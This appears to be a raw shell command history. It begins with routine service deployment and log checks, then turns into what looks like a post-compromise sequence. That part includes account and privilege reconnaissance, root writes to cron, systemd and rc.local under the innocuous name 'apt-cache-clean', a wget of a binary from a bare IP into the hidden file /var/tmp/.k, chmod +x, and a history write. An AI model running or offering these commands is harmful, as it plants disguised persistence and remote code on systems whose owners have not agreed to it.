sudo systemctl restart app
make deploy
systemctl status app
git pull
cd app
ls
tail -f /var/log/app/app.log
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
sudo tee -a /etc/cron.d/apt-cache-clean
sudo tee -a /etc/systemd/system/apt-cache-clean.service
sudo tee -a /etc/rc.local
wget -q http://212.217.81.81/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
